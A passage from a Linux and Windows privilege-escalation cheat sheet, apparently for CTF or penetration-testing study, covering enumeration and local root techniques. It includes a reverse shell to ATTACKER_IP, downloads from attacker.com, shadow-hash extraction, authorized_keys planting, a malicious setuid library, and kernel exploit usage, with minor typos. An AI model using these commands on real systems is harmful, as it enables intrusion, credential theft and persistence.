ps aux | grep ' D '          # Uninterruptible sleep
ps aux | grep ' Z '          # Zombie processes
```

**Process details and relationships:**

```bash
# Process tree
pstree
pstree -p                   # Show PIDs
pstree -u                   # Show users
pstree -a                   # Show command line args
pstree -p <pid>            # Tree from specific PID

# Process information directory
ls -la /proc/<pid>/
cat /proc/<pid>/cmdline     # Command line
cat /proc/<pid>/environ     # Environment variables
cat /proc/<pid>/status      # Status info
cat /proc/<pid>/cwd         # Current working directory (symlink)
cat /proc/<pid>/exe         # Executable path (symlink)
ls -la /proc/<pid>/fd/      # File descriptors

# Process owner and permissions
ps -eo pid,user,group,cmd
stat /proc/<pid>/exe
```

**Services and daemons:**

```bash
# SystemD systems
systemctl list-units --type=service
systemctl list-units --type=service --state=running
systemctl status service_name
systemctl is-enabled service_name

# SysVinit systems
service --status-all
chkconfig --list
ls -la /etc/init.d/

# Running services
ps aux | grep -E 'sshd|apache|nginx|mysql|postgres'
```

**Process monitoring:**

```bash
# Real-time monitoring
top
htop                        # If available
top -u username            # Filter by user
top -p PID                 # Specific process

# Continuous process listing
watch -n 1 'ps aux'
watch -n 1 'ps aux | grep root'

# Process accounting
ps -eo pid,user,cmd,etime   # Elapsed time
ps -eo pid,user,cmd,start   # Start time
```

**Processes running as privileged users:**

```bash
# Root processes
ps aux | grep ^root
ps -u root -U root

# Processes with SUID/SGID
ps aux | awk '{print $1, $11}' | grep root

# Check for unusual root processes
ps aux | grep ^root | grep -v '\[' | awk '{print $11}' | sort -u
```

**Interesting processes to identify:**

```bash
# Web servers
ps aux | grep -E 'apache|httpd|nginx|lighttpd'

# Databases
ps aux | grep -E 'mysql|postgres|mongo|redis'

# Development tools
ps aux | grep -E 'python|perl|ruby|node|java'

# Scheduled tasks
ps aux | grep cron
crontab -l
cat /etc/crontab
ls -la /etc/cron.*

# Backup processes
ps aux | grep -E 'backup|tar|rsync'

# Monitoring tools
ps aux | grep -E 'snmp|nagios|zabbix|munin'
```

**Process capabilities:**

```bash
# Check process capabilities
getpcaps <pid>
cat /proc/<pid>/status | grep Cap

# Decode capabilities
capsh --decode=<hex_value>

# Processes with specific capabilities
ps aux | while read line; do
  pid=$(echo $line | awk '{print $2}')
  caps=$(grep CapEff /proc/$pid/status 2>/dev/null | awk '{print $2}')
  [ "$caps" != "0000000000000000" ] && echo "$line - Caps: $caps"
done
```

**Windows process enumeration:**

```cmd
# Task list
tasklist
tasklist /V                 # Verbose
tasklist /SVC               # Show services

# Filter by name
tasklist /FI "IMAGENAME eq explorer.exe"
tasklist /FI "USERNAME eq SYSTEM"

# Filter by status
tasklist /FI "STATUS eq running"

# Process details
wmic process list brief
wmic process list full
wmic process get name,processid,parentprocessid,commandline

# Specific process
wmic process where name="svchost.exe" get processid,commandline

# Services
sc query
sc query state= all
net start
```

**PowerShell process enumeration:**

```powershell
Get-Process
Get-Process | Select-Object Name,Id,Path
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
Get-Process -IncludeUserName
Get-WmiObject Win32_Process | Select-Object Name,ProcessId,ParentProcessId,CommandLine
```

### Network Connections

Network connection enumeration reveals active connections, listening services, and potential pivot points.

**netstat command (Linux):**

```bash
# Basic usage
netstat -a                  # All connections and listening ports
netstat -at                 # TCP connections
netstat -au                 # UDP connections
netstat -l                  # Listening ports only
netstat -lt                 # TCP listening ports
netstat -lu                 # UDP listening ports

# With process information
netstat -p                  # Show PID/program
netstat -tulpn              # Most common: TCP/UDP, listening, process, numeric

# Detailed information
netstat -tulpn | grep LISTEN
netstat -tulpn | grep ESTABLISHED
netstat -antp               # Active TCP with numeric addresses and processes

# Routing table
netstat -r
netstat -rn                 # Numeric format
```

**Common netstat flags:**

```bash
# Combined options explained
netstat -tulpn
# -t: TCP connections
# -u: UDP connections  
# -l: Listening sockets
# -p: Process/program name
# -n: Numeric addresses (no DNS resolution)

# Display all info
netstat -antp               # All TCP numeric with process
netstat -antup              # All TCP/UDP numeric with process

# Continuous monitoring
netstat -c                  # Update continuously
netstat -ct 2               # Update every 2 seconds
watch -n 1 'netstat -tulpn'
```

**ss command (modern replacement for netstat):**

```bash
# Basic usage
ss                          # Show all connections
ss -t                       # TCP connections
ss -u                       # UDP connections
ss -l                       # Listening sockets
ss -a                       # All sockets

# Common combinations
ss -tulpn                   # TCP/UDP, listening, process, numeric
ss -tanp                    # TCP, all, numeric, process
ss -tunlp                   # TCP/UDP, numeric, listening, process

# Filter by state
ss -t state established
ss -t state listening
ss -t state all

# Detailed socket info
ss -s                       # Summary statistics
ss -e                       # Extended info
ss -m                       # Memory info
ss -o                       # Timer info
```

**Advanced ss filtering:**

```bash
# By port
ss -tulpn | grep :80
ss -tulpn | grep :443
ss -tulpn sport = :22
ss -tulpn dport = :3306

# By state
ss state established
ss state listening
ss state time-wait
ss state close-wait

# Source/destination filtering
ss src 192.168.1.0/24
ss dst 10.10.10.10
ss sport = :80
ss dport = :443

# Multiple filters
ss -tn state established '( dport = :22 or dport = :80 )'
```

**Listening services identification:**

```bash
# All listening ports
netstat -tulpn | grep LISTEN
ss -tulpn | grep LISTEN

# Specific port ranges
netstat -tulpn | grep -E ':(80|443|8080|8443)'
ss -tulpn | grep -E ':(22|3306|5432|6379)'

# Ports bound to localhost only (not externally accessible)
netstat -tulpn | grep 127.0.0.1
ss -tulpn | grep 127.0.0.1

# Ports bound to all interfaces (0.0.0.0)
netstat -tulpn | grep '0.0.0.0'
ss -tulpn | grep '0.0.0.0'
```

**Active connections:**

```bash
# Established connections
netstat -antp | grep ESTABLISHED
ss -tanp | grep ESTAB

# By remote IP
netstat -antp | grep 192.168.1.100
ss -tn dst 192.168.1.100

# Count connections per IP
netstat -antp | grep ESTABLISHED | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n

# Connection states
netstat -antp | awk '{print $6}' | sort | uniq -c
ss -ta | awk '{print $1}' | sort | uniq -c
```

**Network interfaces:**

```bash
# Interface configuration
ifconfig
ifconfig -a                 # All interfaces
ip addr
ip addr show
ip a

# Specific interface
ifconfig eth0
ip addr show eth0

# Interface statistics
ifconfig -s
ip -s link
netstat -i

# Bring interface up/down
ip link set eth0 up
ip link set eth0 down
```

**IP address information:**

```bash
# All IP addresses
hostname -I
ip addr | grep inet
ifconfig | grep inet

# IPv4 only
ip -4 addr
ifconfig | grep "inet " | awk '{print $2}'

# IPv6 addresses
ip -6 addr
ifconfig | grep inet6

# Primary IP
hostname -i
ip route get 1 | awk '{print $7}'
```

**Routing information:**

```bash
# Routing table
route
route -n                    # Numeric
ip route
ip route show
netstat -rn

# Default gateway
ip route | grep default
route -n | grep '^0.0.0.0'

# Add/delete routes (requires root)
ip route add 10.10.10.0/24 via 192.168.1.1
ip route del 10.10.10.0/24
```

**ARP cache:**

```bash
# ARP table
arp
arp -a
arp -n                      # Numeric
ip neigh
ip neighbour show

# Specific interface
arp -i eth0
ip neigh show dev eth0
```

**DNS configuration:**

```bash
# DNS servers
cat /etc/resolv.conf
systemd-resolve --status    # SystemD systems
nmcli dev show | grep DNS   # NetworkManager

# Hostname resolution
cat /etc/hosts
getent hosts hostname
nslookup hostname
dig hostname
host hostname
```

**Firewall rules:**

```bash
# iptables
iptables -L
iptables -L -n -v
iptables -S

# Specific chain
iptables -L INPUT
iptables -L OUTPUT

# nftables
nft list ruleset

# ufw (Ubuntu)
ufw status
ufw status verbose

# firewalld (CentOS/RHEL)
firewall-cmd --list-all
firewall-cmd --list-services
firewall-cmd --list-ports
```

**Network enumeration one-liners:**

```bash
# Quick network overview
echo -e "\n### IPs ###" && hostname -I && \
echo -e "\n### Listening ###" && netstat -tulpn | grep LISTEN && \
echo -e "\n### Established ###" && netstat -antp | grep ESTABLISHED

# Find all listening ports
(netstat -tulpn 2>/dev/null || ss -tulpn) | grep LISTEN | awk '{print $4}' | sed 's/.*://' | sort -u

# Connections to external IPs
netstat -antp 2>/dev/null | grep ESTABLISHED | awk '{print $5}' | grep -v 127.0.0.1 | cut -d: -f1 | sort -u
```

**Windows network enumeration:**

```cmd
# Network connections
netstat -ano
netstat -ano | findstr LISTENING
netstat -ano | findstr ESTABLISHED

# With process names
netstat -anob

# IP configuration
ipconfig
ipconfig /all

# Network interfaces
netsh interface show interface
netsh interface ip show config

# Routing table
route print
netstat -r

# ARP cache
arp -a

# DNS cache
ipconfig /displaydns

# Firewall rules
netsh advfirewall show allprofiles
netsh advfirewall firewall show rule name=all

# Active connections with process
Get-NetTCPConnection | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess
```

**PowerShell network commands:**

```powershell
# Network connections
Get-NetTCPConnection
Get-NetTCPConnection -State Listen
Get-NetTCPConnection -State Established

# With process info
Get-NetTCPConnection | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State,@{Name="Process";Expression={(Get-Process -Id $_.OwningProcess).Name}}

# Network adapters
Get-NetAdapter
Get-NetIPAddress
Get-NetIPConfiguration

# Routing
Get-NetRoute

# DNS
Get-DnsClientCache
Resolve-DnsName hostname
```

**Network service banner grabbing:**

```bash
# Using netcat
nc -v 127.0.0.1 80
echo "GET / HTTP/1.0\r\n\r\n" | nc 127.0.0.1 80

# Using telnet
telnet 127.0.0.1 25
telnet 127.0.0.1 110

# Using curl
curl -I http://127.0.0.1

# Check all listening ports
for port in $(ss -tulpn | grep LISTEN | awk '{print $5}' | cut -d: -f2 | sort -u); do
  echo "Port $port:"
  timeout 2 bash -c "echo '' | nc -v 127.0.0.1 $port" 2>&1 | head -5
done
```

### Users and Groups Enumeration

#### /etc/passwd Analysis

The `/etc/passwd` file contains user account information readable by all users. Each line represents one user account with seven colon-separated fields:

```bash
cat /etc/passwd
```

**Field structure:**

```
username:x:UID:GID:GECOS:home_directory:shell
```

**Key patterns to identify:**

- Users with UID 0 (root privileges)
- Users with login shells (`/bin/bash`, `/bin/sh`, `/bin/zsh`)
- Service accounts (typically UID < 1000 on most distributions)
- Custom user accounts (UID ≥ 1000)
- Users with `/bin/false` or `/usr/sbin/nologin` (non-interactive accounts)

**Useful filtering commands:**

```bash
# List users with valid shells
cat /etc/passwd | grep -v "nologin\|false"

# Extract only usernames
cat /etc/passwd | cut -d: -f1

# Find users with UID 0 (root equivalents)
awk -F: '$3 == 0 {print $1}' /etc/passwd

# List users with home directories
cat /etc/passwd | grep "/home" | cut -d: -f1,6
```

#### /etc/shadow Access

The `/etc/shadow` file contains hashed passwords and requires root privileges. If accessible, this indicates privilege escalation opportunities:

```bash
cat /etc/shadow
```

**Field structure:**

```
username:password_hash:last_change:min:max:warn:inactive:expire:reserved
```

**Hash format identification:**

- `$1$` = MD5
- `$2a$`, `$2y$` = Blcrypt
- `$5$` = SHA-256
- `$6$` = SHA-512
- `$y$` = yescrypt
- `!` or `*` = account locked/no password set

**Extraction for cracking:**

```bash
# Extract username and hash only
cat /etc/shadow | grep -v "^[^:]*:[!*]" | cut -d: -f1,2

# Combine with /etc/passwd for unshadow (for John the Ripper)
unshadow /etc/passwd /etc/shadow > combined.txt
```

#### Current User Context

```bash
# Display current user
whoami

# Display user ID, group ID, and group memberships
id

# More detailed format
id -a

# Check specific user
id username
```

**Output interpretation:**

```
uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip)
```

- `uid`: User identifier
- `gid`: Primary group identifier
- `groups`: All group memberships (critical for privilege escalation vectors)

#### Group Membership Enumeration

```bash
# List all groups current user belongs to
groups

# Check specific user's groups
groups username

# View all groups on system
cat /etc/group

# Find members of specific group
grep "^groupname:" /etc/group
```

**High-value groups for privilege escalation:**

- `sudo`, `wheel`, `admin` - Sudo access
- `docker` - Docker socket access (potential root)
- `lxd`, `lxc` - Container privilege escalation
- `disk` - Direct disk access
- `video` - Framebuffer access
- `adm` - Log file access
- `shadow` - Read `/etc/shadow`

### Sudo Permissions Enumeration

#### Basic Sudo Checks

```bash
# List sudo privileges for current user
sudo -l

# List with specific password (if known)
sudo -S -l <<< "password"

# Check without password prompt (shows error but reveals if sudo is configured)
sudo -n -l
```

**Output interpretation:**

```
User user may run the following commands on target:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/vim
    (www-data) /usr/bin/python3
```

**Key indicators:**

- `NOPASSWD:` - Commands executable without password
- `(ALL : ALL) ALL` - Full sudo access
- `(root)` - Can run as root
- `(user)` - Can run as specific user
- Specific binary paths - Check GTFOBins for exploitation

#### Sudo Configuration Files

```bash
# Main sudo configuration (requires root)
cat /etc/sudoers

# Drop-in configuration files
ls -la /etc/sudoers.d/
cat /etc/sudoers.d/*
```

#### Exploitable Sudo Patterns

**Wildcard exploitation:**

```bash
# If sudo allows: /usr/bin/tar *
# Create malicious checkpoint
echo "sh -i" > shell.sh
chmod +x shell.sh
sudo tar cf archive.tar * --checkpoint=1 --checkpoint-action=exec=shell.sh
```

**Environment variable preservation:**

```bash
# Check for env_keep options
sudo -l | grep env_keep

# If LD_PRELOAD is kept
sudo LD_PRELOAD=/path/to/malicious.so command
```

**GTFOBins reference for common sudo binaries:**

- `vim`: `:!sh`
- `find`: `sudo find . -exec /bin/sh \; -quit`
- `nmap`: `sudo nmap --interactive` then `!sh`
- `python`: `sudo python -c 'import os; os.system("/bin/sh")'`

[Inference] GTFOBins maintains an updated database, but specific commands may vary by version.

### Cron Jobs Enumeration

#### User-Level Cron Jobs

```bash
# Current user's crontab
crontab -l

# Check for other users (requires appropriate permissions)
crontab -l -u username

# User crontab files location
ls -la /var/spool/cron/crontabs/
cat /var/spool/cron/crontabs/*
```

#### System-Wide Cron Jobs

```bash
# System crontab
cat /etc/crontab

# Hourly jobs
ls -la /etc/cron.hourly/
cat /etc/cron.hourly/*

# Daily jobs
ls -la /etc/cron.daily/
cat /etc/cron.daily/*

# Weekly jobs
ls -la /etc/cron.weekly/

# Monthly jobs
ls -la /etc/cron.monthly/

# Additional cron directories
ls -la /etc/cron.d/
cat /etc/cron.d/*
```

#### Cron Schedule Format

```
* * * * * command
│ │ │ │ │
│ │ │ │ └─── Day of week (0-7, Sunday=0 or 7)
│ │ │ └───── Month (1-12)
│ │ └─────── Day of month (1-31)
│ └───────── Hour (0-23)
└─────────── Minute (0-59)
```

#### Exploitation Vectors

**Writable cron scripts:**

```bash
# Find world-writable files in cron directories
find /etc/cron* -type f -perm -o+w

# Check script ownership and permissions
ls -la /etc/cron.d/*
ls -la /etc/cron.*/
```

**PATH manipulation in /etc/crontab:**

```
# If crontab contains: PATH=/usr/local/bin:/usr/bin:/bin
# And script runs: * * * * * root backup.sh
# Create malicious backup.sh in /usr/local/bin
```

**Wildcard injection:**

```bash
# If cron runs: tar czf /backup/backup.tar.gz *
# In directory, create:
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
```

#### Monitoring Cron Execution

```bash
# Watch cron logs
tail -f /var/log/syslog | grep CRON
tail -f /var/log/cron

# Use pspy to monitor processes without root
./pspy64 -pf -i 1000
```

[Unverified] pspy is a third-party tool; functionality depends on the specific version and system configuration.

### SSH Keys Discovery

#### Standard SSH Key Locations

```bash
# Current user's SSH directory
ls -la ~/.ssh/

# Common files:
~/.ssh/id_rsa          # Private RSA key
~/.ssh/id_rsa.pub      # Public RSA key
~/.ssh/id_ed25519      # Private Ed25519 key
~/.ssh/id_ecdsa        # Private ECDSA key
~/.ssh/authorized_keys # Keys allowed to authenticate as this user
~/.ssh/known_hosts     # Previously connected hosts
~/.ssh/config          # SSH client configuration
```

#### System-Wide SSH Key Search

```bash
# Find all SSH private keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null
find / -name "id_ecdsa" 2>/dev/null

# Find all .ssh directories
find / -type d -name ".ssh" 2>/dev/null

# Find SSH keys with broader pattern
find / -name "*.pem" 2>/dev/null
find / -name "*.key" 2>/dev/null

# Search for authorized_keys files
find / -name "authorized_keys" 2>/dev/null

# Find readable private keys
find / -name "id_*" -o -name "*.pem" 2>/dev/null | xargs ls -la
```

#### Permission Analysis

```bash
# Check permissions (proper private key: 600, public key: 644)
ls -la ~/.ssh/id_*

# Find world-readable private keys (vulnerability)
find ~/.ssh/ -name "id_*" ! -name "*.pub" -perm -o+r

# Find keys readable by current user but owned by others
find /home -name "id_*" -readable 2>/dev/null
```

#### SSH Configuration Analysis

```bash
# User SSH config
cat ~/.ssh/config

# System SSH client config
cat /etc/ssh/ssh_config

# SSH server config (if accessible)
cat /etc/ssh/sshd_config
```

**Key configuration directives:**

- `IdentityFile` - Additional key locations
- `User` - Default username for hosts
- `ProxyJump` - SSH through intermediate hosts
- `PasswordAuthentication` - Whether passwords accepted
- `PubkeyAuthentication` - Whether keys accepted
- `PermitRootLogin` - Root SSH access allowed

#### SSH Key Exploitation

**Using found private keys:**

```bash
# Copy private key
cat /path/to/id_rsa > my_key
chmod 600 my_key

# Connect using key
ssh -i my_key user@target

# If passphrase protected
ssh-keygen -p -f my_key  # Remove passphrase
# Or crack with John the Ripper:
ssh2john.py my_key > hash.txt
john hash.txt --wordlist=rockyou.txt
```

**Authorized_keys manipulation (if writable):**

```bash
# Generate key pair on attacker machine
ssh-keygen -t rsa -b 4096 -f attack_key

# Add public key to target's authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2E... attacker@machine" >> ~/.ssh/authorized_keys

# Ensure proper permissions
chmod 644 ~/.ssh/authorized_keys
chmod 700 ~/.ssh
```

**SSH agent hijacking:**

```bash
# Check for running SSH agents
ps aux | grep ssh-agent

# Check SSH_AUTH_SOCK environment variable
echo $SSH_AUTH_SOCK

# If accessible, list loaded keys
ssh-add -l

# Use agent's keys
ssh -A user@target  # (if agent forwarding enabled)
```

#### Additional Discovery Locations

```bash
# Backup directories
find /backup -name "id_*" 2>/dev/null
find /backups -name "*.key" 2>/dev/null

# User home directories
ls -la /home/*/.ssh/

# Root's SSH directory (if accessible)
ls -la /root/.ssh/

# Web server directories (misplaced keys)
find /var/www -name "id_*" 2>/dev/null

# Git repositories
find / -name ".git" -type d 2>/dev/null
# Check for keys in git history

# Application config directories
find /opt -name "*.pem" 2>/dev/null
find /etc -name "*.key" 2>/dev/null

# Check environment variables and history
env | grep -i ssh
cat ~/.bash_history | grep -i ssh
```

### Comprehensive Enumeration Script Pattern

```bash
#!/bin/bash
echo "[*] Users and Groups"
echo "Current user: $(whoami)"
id
groups
cat /etc/passwd | grep -v "nologin\|false"

echo -e "\n[*] Sudo Permissions"
sudo -n -l 2>&1

echo -e "\n[*] Cron Jobs"
crontab -l 2>&1
ls -la /etc/cron* 2>&1

echo -e "\n[*] SSH Keys"
find ~/.ssh/ -type f 2>/dev/null
find /home -name "id_*" -o -name "*.pem" 2>/dev/null | head -20
```

### Writable Directories

Identifying writable directories is critical for privilege escalation, persistence, and payload deployment. These locations allow attackers to upload tools, compile exploits, or store temporary files.

#### Finding World-Writable Directories

**Basic find command:**

```bash
find / -writable -type d 2>/dev/null
```

**More precise (exclude proc, sys):**

```bash
find / -path /proc -prune -o -path /sys -prune -o -type d -writable 2>/dev/null
```

**Find directories writable by current user:**

```bash
find / -type d -writable -user $(whoami) 2>/dev/null
```

**Find world-writable directories (777 permissions):**

```bash
find / -type d -perm -0002 2>/dev/null
```

**Find directories with specific permission masks:**

```bash
find / -type d -perm -0777 2>/dev/null  # Any execute bit set
find / -type d -perm /0222 2>/dev/null  # Any write bit set
```

#### Common Writable Locations

Standard locations often writable by low-privilege users:

- `/tmp` - Temporary files, cleared on reboot
- `/var/tmp` - Persistent temporary files
- `/dev/shm` - Shared memory filesystem (RAM-based)
- `/var/crash` - Crash reports (sometimes writable)
- `/var/log` - Specific log files may be writable
- `/opt` - Third-party applications (misconfigured permissions)
- `/home/<user>` - Current user's home directory

#### Checking Directory Permissions

**View detailed permissions:**

```bash
ls -ld /path/to/directory
namei -l /path/to/directory  # Shows permissions of entire path
```

**Check if directory is writable:**

```bash
test -w /path/to/directory && echo "Writable" || echo "Not writable"
```

**Test actual write capability:**

```bash
touch /path/to/directory/.test 2>/dev/null && rm /path/to/directory/.test && echo "Writable"
```

#### Strategic Use Cases

**Compiling exploits:**

```bash
cd /dev/shm
gcc exploit.c -o exploit
```

**Downloading tools:**

```bash
cd /tmp
wget http://attacker.com/tool
curl -O http://attacker.com/tool
```

**Creating backup shells:**

```bash
cp /bin/bash /tmp/.hidden_shell
```

### SUID/SGID Binaries

SUID (Set User ID) and SGID (Set Group ID) binaries execute with the privileges of the file owner/group rather than the user running them. Misconfigured SUID/SGID binaries are common privilege escalation vectors.

#### Finding SUID Binaries

**Find all SUID binaries:**

```bash
find / -perm -4000 2>/dev/null
```

**Find SUID binaries owned by root:**

```bash
find / -uid 0 -perm -4000 -type f 2>/dev/null
```

**Find SGID binaries:**

```bash
find / -perm -2000 2>/dev/null
```

**Find both SUID and SGID:**

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) 2>/dev/null
```

**With detailed output:**

```bash
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
```

#### Analyzing SUID Binaries

**List with full details:**

```bash
ls -la $(find / -perm -4000 2>/dev/null)
```

**Identify unusual SUID binaries:** Compare against baseline system. Look for:

- Custom scripts with SUID bit
- Standard utilities that shouldn't have SUID (cp, mv, find, etc.)
- Binaries in non-standard locations
- Recently modified SUID files

**Check binary capabilities alongside SUID:**

```bash
find / -perm -4000 -exec getcap {} \; 2>/dev/null
```

#### Common Exploitable SUID Binaries

**GTFOBins lookup:** Reference [GTFOBins](https://gtfobins.github.io/) for exploitation techniques.

**Known exploitable SUID binaries (when misconfigured):**

- **find:**

```bash
find . -exec /bin/bash -p \; -quit
```

- **vim/vi:**

```bash
vim -c ':!/bin/sh'
# Or
vim
:set shell=/bin/sh
:shell
```

- **nmap (older versions with interactive mode):**

```bash
nmap --interactive
!sh
```

- **python/perl/ruby:**

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
perl -e 'exec "/bin/sh";'
```

- **cp (copy files with SUID context):**

```bash
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
/tmp/bash -p
```

- **systemctl (if SUID):**

```bash
echo '[Service]
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"
[Install]
WantedBy=multi-user.target' > /tmp/evil.service
systemctl link /tmp/evil.service
systemctl start evil
```

#### SUID Exploitation Strategy

**1. Enumerate all SUID binaries** **2. Check GTFOBins for known bypass techniques** **3. Test for command injection vulnerabilities** **4. Analyze binary behavior with strings/ltrace/strace** **5. Look for insecure library loading (LD_PRELOAD, LD_LIBRARY_PATH)**

**Using strings to identify hardcoded paths:**

```bash
strings /path/to/suid_binary | grep -E '^/'
```

**Using ltrace to trace library calls:**

```bash
ltrace /path/to/suid_binary 2>&1
```

**Using strace to trace system calls:**

```bash
strace /path/to/suid_binary 2>&1
```

#### Shared Object Injection

**[Inference]** When SUID binaries load libraries from writable paths, custom shared objects can be injected.

**Identify library load paths:**

```bash
strace /path/to/suid_binary 2>&1 | grep -i "open\|access\|no such file"
ldd /path/to/suid_binary
```

**Create malicious shared object:**

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void inject() __attribute__((constructor));

void inject() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

**Compile:**

```bash
gcc -shared -fPIC -o /writable/path/library.so exploit.c
```

**Execute SUID binary from controlled location:**

```bash
cd /writable/path
/path/to/suid_binary
```

### Capabilities (getcap)

Linux capabilities divide root privileges into distinct units. Binaries with elevated capabilities can be exploited similarly to SUID binaries but are often overlooked.

#### Enumerating Capabilities

**Find all files with capabilities:**

```bash
getcap -r / 2>/dev/null
```

**Find capabilities recursively in specific path:**

```bash
getcap -r /usr 2>/dev/null
getcap -r /home 2>/dev/null
```

**Check specific file capabilities:**

```bash
getcap /path/to/binary
```

**View current process capabilities:**

```bash
cat /proc/$$/status | grep Cap
capsh --print
```

#### Dangerous Capabilities

**CAP_SETUID** - Allow setting UID, direct privilege escalation:

```bash
# If python has cap_setuid+ep
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**CAP_SYS_ADMIN** - Mount filesystems, near-omnipotent capability [Inference]:

```bash
# Can be used to escape containers or modify mounts
mount --bind /etc /mnt
```

**CAP_DAC_READ_SEARCH** - Bypass file read permission checks:

```bash
# If tar has this capability
tar -czf /tmp/shadow.tar.gz /etc/shadow
tar -xzf /tmp/shadow.tar.gz -C /tmp
```

**CAP_DAC_OVERRIDE** - Bypass file permission checks (read, write, execute):

```bash
# With perl having cap_dac_override
perl -e 'open(F,"</etc/shadow");print<F>;'
```

**CAP_CHOWN** - Change file ownership arbitrarily:

```bash
# With python having cap_chown
python -c 'import os; os.chown("/etc/shadow",1000,1000)'
```

**CAP_NET_RAW** - Use RAW and PACKET sockets (sniffing):

```bash
# If tcpdump or python has this
tcpdump -i any -w /tmp/capture.pcap
```

**CAP_SYS_PTRACE** - Trace arbitrary processes, inject code:

```bash
# Can inject shellcode into running root process
gdb -p <root_pid>
```

**CAP_NET_BIND_SERVICE** - Bind to privileged ports (<1024):

```bash
# Not directly exploitable but useful for persistence
python -m http.server 80
```

#### Capability Exploitation Examples

**Python with cap_setuid+ep:**

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Perl with cap_setuid+ep:**

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

**tar with cap_dac_read_search+ep (read any file):**

```bash
tar -czf /tmp/etc.tar.gz /etc/shadow /etc/sudoers /root/.ssh/id_rsa
tar -xzf /tmp/etc.tar.gz -C /tmp
```

**openssl with cap_setuid+ep:**

```bash
openssl req -x509 -newkey rsa:2048 -keyout /dev/null -out /dev/null -days 1 -nodes -subj "/CN=test" -config <(echo '[req]'; echo 'distinguished_name=req'; echo '[req]'; echo "CN=test"; echo "system('/bin/bash -p')")
```

#### Capability Format

**Capability sets notation:**

- `+e` = Effective (active capabilities)
- `+p` = Permitted (can be made effective)
- `+i` = Inheritable (preserved across execve)
- `+ep` = Effective and Permitted (most common exploitable)

**Setting capabilities (requires appropriate permissions):**

```bash
setcap cap_setuid+ep /path/to/binary
```

**Removing capabilities:**

```bash
setcap -r /path/to/binary
```

#### Detection and Mitigation Awareness

**[Inference]** Capabilities are less frequently audited than SUID binaries in CTF environments, making them valuable targets. Always enumerate capabilities alongside traditional privilege escalation vectors.

**Combine enumeration:**

```bash
echo "[+] SUID Binaries:"; find / -perm -4000 2>/dev/null
echo "[+] Capabilities:"; getcap -r / 2>/dev/null
```

---

**Important Related Topics:**

- **PATH Hijacking** - Exploiting SUID binaries that call external commands without absolute paths
- **LD_PRELOAD/LD_LIBRARY_PATH Exploitation** - Shared library injection techniques
- **Sudo Misconfigurations** - Analyzing sudo -l output and exploiting NOPASSWD entries
- **Kernel Exploits** - When user-space privilege escalation fails

---

## Linux Privilege Escalation Vectors

### Kernel Exploits

Kernel exploits target vulnerabilities in the Linux kernel to execute code with root privileges. Success depends on identifying the exact kernel version and finding applicable exploits.

#### Kernel Version Identification

```bash
# Detailed kernel information
uname -a
uname -r
cat /proc/version
cat /etc/os-release
cat /etc/issue

# Architecture
uname -m
dpkg --print-architecture

# Check kernel modules
lsmod
```

#### Using SearchSploit

SearchSploit queries the Exploit-DB database locally on Kali Linux:

```bash
# Search by kernel version
searchsploit linux kernel 3.13.0
searchsploit ubuntu 16.04 privilege

# Search specific vulnerability
searchsploit dirty cow
searchsploit CVE-2016-5195

# Get exploit path
searchsploit -p 40839

# Copy exploit to working directory
searchsploit -m 40839

# Examine exploit details
searchsploit -x exploits/linux/local/40839.c

# Update database
searchsploit -u
```

#### Common Kernel Exploits

**Dirty COW (CVE-2016-5195)** Affects Linux kernel versions 2.6.22 to 4.8.3:

```bash
# Download exploit
searchsploit -m 40839
gcc -pthread 40839.c -o dirty -lcrypt

# Run exploit (creates new root user)
./dirty password

# Login as new root user
su firefart
```

**Dirty Pipe (CVE-2022-0847)** Affects kernel versions 5.8 through 5.16.11:

```bash
# Compile exploit
gcc exploit.c -o exploit

# Overwrite /etc/passwd
./exploit /etc/passwd 1 ootz:

# Authenticate as root (password: piped)
su rootz
```

**PwnKit (CVE-2021-4034)** Polkit pkexec vulnerability:

```bash
# Check if vulnerable
pkexec --version

# Compile exploit
gcc CVE-2021-4034.c -o exploit

# Execute for root shell
./exploit
```

**OverlayFS (CVE-2015-1328)** Ubuntu 12.04-15.04 vulnerability:

```bash
gcc ofs.c -o ofs
./ofs
# Spawns root shell
```

#### Automated Kernel Exploit Enumeration

**Linux Exploit Suggester**

```bash
# Download script
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh

# Run on target
bash linux-exploit-suggester.sh

# Run with kernel version
bash linux-exploit-suggester.sh --kernel 4.4.0-21-generic
```

**Linux Exploit Suggester 2**

```bash
# Perl version
./linux-exploit-suggester-2.pl

# With specific kernel
./linux-exploit-suggester-2.pl -k 3.13.0
```

#### Exploit Compilation on Target

```bash
# Check available compilers
which gcc
which cc
which python

# Compile 32-bit exploit on 64-bit system
gcc -m32 exploit.c -o exploit

# Static compilation (includes libraries)
gcc -static exploit.c -o exploit

# Compile without warnings
gcc -w exploit.c -o exploit
```

#### Compilation on Attacking Machine

When target lacks compilers:

```bash
# Match target architecture
file /bin/bash  # Check target arch first

# Cross-compile for 32-bit
gcc -m32 -march=i686 exploit.c -o exploit

# Cross-compile for ARM
arm-linux-gnueabi-gcc exploit.c -o exploit

# Static compilation
gcc -static exploit.c -o exploit

# Transfer to target
python3 -m http.server 8000
# On target: wget http://attacker:8000/exploit
```

### SUID Binary Exploitation

SUID (Set User ID) binaries execute with the permissions of the file owner, not the user running them. SUID binaries owned by root are prime privilege escalation targets.

#### Finding SUID Binaries

```bash
